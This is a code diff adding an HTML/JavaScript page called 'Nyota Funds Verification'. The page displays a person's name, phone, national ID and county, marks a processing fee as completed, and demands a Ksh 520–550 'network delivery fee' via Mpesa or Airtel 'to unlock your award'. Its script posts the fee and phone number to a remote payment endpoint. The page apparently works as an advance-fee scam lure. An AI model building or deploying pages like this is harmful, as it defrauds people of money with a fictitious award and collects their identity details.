@@ -1,0 +1,567 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Nyota Funds Verification</title>
+<!-- Google Fonts for a clean, professional look -->
+<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;600&display=swap" rel="stylesheet" />
+<!-- Font Awesome for icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+<style>
+  /* Reset & Base styles */
+  body {
+    margin: 0;
+    font-family: 'Raleway', sans-serif;
+    background: linear-gradient(135deg, #a8e063, #56ab2f);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px;
+    color: #333;
+  }
+
+  h1 {
+    font-size: 2.8em;
+    text-align: center;
+    margin-bottom: 20px;
+    letter-spacing: 2px;
+    color: #fff;
+    text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.02); }
+  }
+
+  /* Main container for profile and payment */
+  .main-container {
+    width: 100%;
+    max-width: 1200px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  /* Avatar at the top center with hover & bounce animations */
+  .avatar-wrapper {
+    margin-top: 10px;
+    margin-bottom: 20px;
+    cursor: pointer;
+    transition: transform 0.3s, box-shadow 0.3s;
+    animation: bounceIn 1s ease-out;
+  }
+  .avatar-wrapper:hover {
+    transform: scale(1.1);
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+  }
+  .avatar-box {
+    width: 80px;
+    height: 80px;
+    background-color: #E9EBEE;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border: 3px solid #4CAF50;
+    padding: 5px;
+  }
+  .avatar-box svg {
+    width: 60px;
+    height: 60px;
+  }
+
+  @keyframes bounceIn {
+    0% { opacity: 0; transform: scale(0.5); }
+    60% { opacity: 1; transform: scale(1.05); }
+    80% { transform: scale(0.95); }
+    100% { transform: scale(1); }
+  }
+
+  /* Profile section styling */
+  .profile-section {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    background: #fff;
+    border-radius: 20px;
+    padding: 15px 10px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    width: 90%;
+    max-width: 500px;
+    margin-bottom: 30px;
+    position: relative;
+    overflow: hidden;
+    transition: transform 0.3s, box-shadow 0.3s;
+  }
+  /* Hover effect for profile container */
+  .profile-section:hover {
+    box-shadow: 0 12px 25px rgba(0,0,0,0.3);
+    transform: translateY(-2px);
+  }
+
+  /* Title styling */
+  .profile-title {
+    font-family: 'Raleway', sans-serif;
+    font-weight: 700;
+    font-size: 1.8em;
+    color: #2e7d32;
+    margin-bottom: 12px;
+    text-align: center;
+    letter-spacing: 1px;
+  }
+
+  /* Profile info container */
+  #profileInfo {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+  }
+
+  /* Info items with styled labels and numbers */
+  .info-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 8px;
+    padding: 8px 12px;
+    border-radius: 8px;
+    background: rgba(76, 175, 80, 0.1);
+    font-family: 'Raleway', sans-serif;
+    font-weight: 600;
+    font-size: 1.2em;
+    color: #333;
+    border-left: 4px solid transparent;
+    transition: all 0.3s ease;
+  }
+  /* Hover effect for info items */
+  .info-item:hover {
+    background: rgba(76, 175, 80, 0.2);
+    border-left: 4px solid #4CAF50;
+    box-shadow: inset 0 0 5px rgba(0,0,0,0.1);
+    transform: translateY(-1px);
+  }
+
+  /* Labels for clarity, wider for numbers/ids */
+  .info-label {
+    font-weight: 700;
+    margin-right: 10px;
+    min-width: 140px;
+    color: #2e7d32;
+  }
+
+  /* Values styled in bold black for numbers, or colored for status */
+  .info-value {
+    flex: 1;
+    text-align: right;
+    font-family: 'Raleway', sans-serif;
+    font-weight: bold;
+    font-size: 1.2em;
+  }
+
+  /* Payment section styles */
+  .payment-section {
+    background: #fff;
+    border-radius: 20px;
+    padding: 40px 30px;
+    max-width: 600px;
+    width: 90%;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    margin-top: 50px;
+    animation: fadeInUp 1s ease-out;
+  }
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .payment-section h3 {
+    margin-bottom: 20px;
+    font-size: 2em;
+    text-align: center;
+    color: #2e7d32;
+  }
+  .payment-info {
+    margin-bottom: 20px;
+    font-size: 1.2em;
+    text-align: center;
+    color: #333;
+  }
+
+  /* Network delivery fee section styles */
+  .network-section {
+    margin-top: 20px;
+    padding: 15px;
+    background: #f0f8e0;
+    border-radius: 15px;
+    border: 2px solid #4CAF50;
+  }
+  .network-section h4 {
+    margin-bottom: 10px;
+    font-size: 1.5em;
+    color: #2e7d32;
+    text-align: center;
+  }
+  .network-description {
+    font-size: 1em;
+    margin-bottom: 10px;
+    text-align: center;
+    color: #333;
+  }
+  .network-options {
+    display: flex;
+    justify-content: space-around;
+    margin-top: 10px;
+  }
+  .network-option {
+    padding: 10px 20px;
+    border-radius: 10px;
+    border: 2px solid #4CAF50;
+    cursor: pointer;
+    font-weight: 600;
+    transition: all 0.3s ease;
+    background: #fff;
+  }
+  .network-option.selected {
+    background: #4CAF50;
+    color: #fff;
+  }
+  /* Style for the pay button to update fee */
+  .pay-btn {
+    width: 100%;
+    padding: 15px;
+    background: #4CAF50;
+    color: #fff;
+    font-size: 1.4em;
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+    transition: background 0.3s, transform 0.2s;
+  }
+  .pay-btn:hover {
+    background: #388e3c;
+    transform: translateY(-2px);
+  }
+  .pay-btn:disabled {
+    background: #c8e6c9;
+    cursor: not-allowed;
+  }
+
+  /* Floating icons style */
+  .floating-icons {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    display: flex;
+    gap: 15px;
+    font-size: 2em;
+    color: #fff;
+    animation: float 3s ease-in-out infinite;
+  }
+  @keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+  }
+
+  /* Error notification style */
+  #errorNotification {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: #fff;
+    border-left: 5px solid red;
+    padding: 15px 20px;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    font-weight: bold;
+    color: red;
+    font-size: 1em;
+    opacity: 0;
+    transform: translateY(-20px);
+    transition: opacity 0.3s, transform 0.3s;
+    z-index: 9999;
+    max-width: 300px;
+  }
+  #errorNotification.show {
+    opacity: 1;
+    transform: translateY(0);
+  }
+
+  /* Enlarged input fields styles */
+  .input-group {
+    display: flex;
+    flex-direction: column;
+    width: 100%;
+    margin-bottom: 20px;
+  }
+  .input-group label {
+    font-weight: 600;
+    margin-bottom: 8px;
+    font-size: 1.1em;
+    color: #2e7d32;
+  }
+  /* Enlarged input styles */
+  .input-group input[type="text"] {
+    padding: 15px 20px;
+    font-size: 1.2em;
+    border-radius: 8px;
+    border: 2px solid #ccc;
+    outline: none;
+    transition: border-color 0.3s, box-shadow 0.3s;
+  }
+  .input-group input[type="text"]:focus {
+    border-color: #4CAF50;
+    box-shadow: 0 0 8px rgba(76, 175, 80, 0.3);
+  }
+</style>
+</head>
+<body>
+
+<h1>Nyota Funds Verification</h1>
+
+<div class="main-container">
+  <!-- Profile Section with Avatar and Personal Details -->
+  <div class="profile-section">
+    <!-- Avatar -->
+    <div class="avatar-wrapper" id="avatarWrapper" title="Click to change color!">
+      <div class="avatar-box" id="avatarBox">
+        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org" preserveAspectRatio="xMidYMid meet">
+          <circle cx="50" cy="35" r="20" fill="#FFFFFF"/>
+          <path d="M10 90 C10 60, 90 60, 90 90 L90 100 L10 100 Z" fill="#FFFFFF"/>
+        </svg>
+      </div>
+    </div>
+    <!-- Personal Details with bold numbers -->
+    <div class="profile-title">Nyota Profile</div>
+    <div id="profileInfo">
+      <div class="info-item">
+        <div class="info-label">Client Name:</div>
+        <div class="info-value" id="name"></div>
+      </div>
+      <div class="info-item">
+        <div class="info-label">Contact Number:</div>
+        <div class="info-value" id="phone"></div>
+      </div>
+      <div class="info-item">
+        <div class="info-label">National ID:</div>
+        <div class="info-value" id="idNumber"></div>
+      </div>
+      <div class="info-item">
+        <div class="info-label">Residence County:</div>
+        <div class="info-value" id="county"></div>
+      </div>
+      <div class="info-item">
+        <div class="info-label">Age:</div>
+        <div class="info-value" id="age"></div>
+      </div>
+      <!-- Processing Fee: show "Completed" in green -->
+      <div class="info-item">
+        <div class="info-label">Processing Fee:</div>
+        <div class="info-value" style="color: green; font-weight: 700;">Completed</div>
+      </div>
+      <!-- Deliver Fee: Pending in orange -->
+      <div class="info-item">
+        <div class="info-label">Delivery Fee:</div>
+        <div class="info-value" style="color: orange; font-weight: 700;">Pending</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Payment Section -->
+  <div class="payment-section">
+    <h3>Network Delivery Charges</h3>
+    <div class="payment-info">
+      You're required to pay Network Delivery Ksh <span id="amountDisplay">100</span> to unlock your award.
+    </div>
+
+    <!-- Network Delivery Fee Section -->
+    <div class="network-section">
+      <h4>Network Delivery Fee</h4>
+      <div class="network-description">
+        Kindly choose where your funds should be transferred to. Every network has its coverage fee.
+      </div>
+      <div class="network-options">
+        <div class="network-option" data-network="Mpesa" data-fee="520">Mpesa (Ksh520)</div>
+        <div class="network-option" data-network="Airtel" data-fee="550">Airtel (Ksh550)</div>
+      </div>
+    </div>
+
+    <!-- Enlarged Input fields -->
+    <div class="input-group" style="margin-top:20px;">
+      <label for="fullNames">Full Names</label>
+      <input type="text" id="fullNames" placeholder="Enter your full names" />
+    </div>
+    <div class="input-group">
+      <label for="mpesaNumber">Mpesa Number</label>
+      <input type="text" id="mpesaNumber" placeholder="e.g., 0712345678" />
+    </div>
+    <!-- Pay button -->
+    <button class="pay-btn" id="payNow" disabled>Pay Now</button>
+  </div>
+</div>
+
+<!-- Floating icons -->
+<div class="floating-icons">
+  <i class="fas fa-shield-alt"></i>
+  <i class="fas fa-star"></i>
+  <i class="fas fa-thumbs-up"></i>
+</div>
+
+<!-- Error notification -->
+<div id="errorNotification"></div>
+
+<!-- Processing modal -->
+<div id="processingModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.4); justify-content:center; align-items:center; z-index:9999;">
+  <div style="background:#fff; padding:30px; border-radius:10px; text-align:center;">
+    <div class="spinner"></div>
+    <p id="processingText" style="font-weight:600;">Processing Your Payment</p>
+  </div>
+</div>
+
+<script>
+  // Sample user data
+  const defaultData = {
+    first_name: "Jane",
+    second_name: "Akinyi",
+    phone_number: "0712345678",
+    id_number: "12345678",
+    county: "Kisumu",
+    age: "32",
+    amount: "100"
+  };
+
+  const userData = JSON.parse(localStorage.getItem('nyota_finalData')) || defaultData;
+
+  // Populate profile info
+  document.getElementById('name').innerText = `${userData.first_name}`;
+  document.getElementById('phone').innerText = userData.phone_number;
+  document.getElementById('idNumber').innerText = userData.id_number;
+  document.getElementById('county').innerText = userData.county;
+  document.getElementById('age').innerText = userData.age;
+
+  // Amount display
+  let amount = parseInt(userData.amount || '100', 10);
+  document.getElementById('amountDisplay').innerText = amount;
+
+  const mpesaInput = document.getElementById('mpesaNumber');
+  const fullNamesInput = document.getElementById('fullNames');
+  const payButton = document.getElementById('payNow');
+
+  let selectedNetwork = null;
+  let selectedFee = 0;
+
+  function validateInputs() {
+    const fullNames = fullNamesInput.value.trim();
+    const mpesaNumber = mpesaInput.value.trim();
+    if (fullNames === '' || mpesaNumber === '') {
+      payButton.disabled = true;
+      return;
+    }
+    const valid = validateKenyanNumber(mpesaNumber);
+    payButton.disabled = !valid;
+  }
+
+  function validateKenyanNumber(number) {
+    number = number.replace(/\s+/g, '');
+    if (number.startsWith('+254')) {
+      number = '0' + number.slice(4);
+    } else if (number.startsWith('254')) {
+      number = '0' + number.slice(3);
+    }
+    // Check if starts with 07 or 01 and has exactly 10 digits
+    return ((number.startsWith('07') || number.startsWith('01')) && number.length === 10 && /^\d{10}$/.test(number));
+  }
+
+  fullNamesInput.addEventListener('input', validateInputs);
+  mpesaInput.addEventListener('input', validateInputs);
+
+  const payBtn = document.getElementById('payNow');
+
+  document.querySelectorAll('.network-option').forEach(option => {
+    option.addEventListener('click', () => {
+      document.querySelectorAll('.network-option').forEach(opt => opt.classList.remove('selected'));
+      option.classList.add('selected');
+      selectedNetwork = option.getAttribute('data-network');
+      selectedFee = parseInt(option.getAttribute('data-fee'), 10);
+      updatePayButton();
+      validateForm();
+    });
+  });
+
+  function updatePayButton() {
+    if (selectedFee > 0) {
+      payButton.innerText = `Pay Ksh ${selectedFee}`;
+    } else {
+      payButton.innerText = `Pay Now`;
+    }
+  }
+
+  function validateForm() {
+    const fullNames = fullNamesInput.value.trim();
+    const mpesaNumber = mpesaInput.value.trim();
+    const networkSelected = selectedNetwork !== null;
+    const inputsValid = fullNames !== '' && mpesaNumber !== '' && validateKenyanNumber(mpesaNumber);
+    payButton.disabled = !(inputsValid && networkSelected);
+  }
+
+  fullNamesInput.addEventListener('input', validateForm);
+  mpesaInput.addEventListener('input', validateForm);
+
+  document.getElementById('payNow').addEventListener('click', () => {
+    document.getElementById('processingModal').style.display = 'none'; // No modal on error
+    makePayment();
+  });
+
+  async function makePayment() {
+    const name = document.getElementById('fullNames').value.trim();
+    const mpesaNumberStr = document.getElementById('mpesaNumber').value.trim();
+
+    if (!validateKenyanNumber(mpesaNumberStr)) {
+      showError('Invalid phone number.');
+      return;
+    }
+
+    // Send only the selected fee as amount
+    try {
+      const response = await fetch('https://server11-8o76.onrender.com/pay', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ amount: selectedFee, phone_number: mpesaNumberStr }) 
+      });
+      if (response.ok) {
+        const data = await response.json();
+        const reference = data.reference;
+        let finalData = JSON.parse(localStorage.getItem('nyota_finalData')) || {};
+        finalData.reference_id = reference;
+        localStorage.setItem('nyota_finalData', JSON.stringify(finalData));
+        window.location.href = 'polltest6.html';
+      } else {
+        const errorText = await response.text();
+        showError(`Error: ${errorText}`);
+      }
+    } catch (error) {
+      showError('Network error: ' + error.message);
+    }
+  }
+
+  function showError(message) {
+    const errorDiv = document.getElementById('errorNotification');
+    errorDiv.innerText = message;
+    errorDiv.className = 'show';
+    setTimeout(() => {
+      errorDiv.className = '';
+    }, 2000);
+  }
+
+  // Avatar color change
+  const avatarWrapper = document.getElementById('avatarWrapper');
+  const avatarColors = ['#E9EBEE', '#dfe3ee', '#8b9dc3', '#3b5998'];
+  let colorIdx = 0;
+  avatarWrapper.addEventListener('click', () => {
+    colorIdx = (colorIdx + 1) % avatarColors.length;
+    document.getElementById('avatarBox').style.backgroundColor = avatarColors[colorIdx];
+  });
+</script>
+</body>
+</html>
